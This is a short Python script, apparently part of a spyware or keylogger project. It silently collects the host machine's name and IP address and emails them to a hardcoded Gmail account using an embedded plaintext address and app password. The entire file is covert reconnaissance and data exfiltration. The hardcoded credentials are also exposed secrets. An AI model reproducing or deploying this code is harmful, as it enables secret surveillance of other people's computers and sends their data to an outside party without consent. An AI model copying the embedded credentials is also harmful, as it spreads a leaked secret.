try: #import necessary libraries
    import socket
    from mail import send_mail #Send Log to Mail
except ModuleNotFoundError:
    exit(0)
finally:
    EMAIL_ADDRESS = "sudeeproy67@gmail.com"
    EMAIL_PASSWORD = "nusrpvxakgvnhefp"
    FILENAME = "C:/Users/sudee/ISAA/output.txt"

    class system_info: 
        def __init__(self, email, password):
            self.log = "System Details"
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + '\n' + string

        def run(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            self.appendlog(hostname)
            self.appendlog(ip)
            send_mail(self.email, self.password, "\n\n" + self.log)

    SystemInfo = system_info(EMAIL_ADDRESS, EMAIL_PASSWORD)
    SystemInfo.run()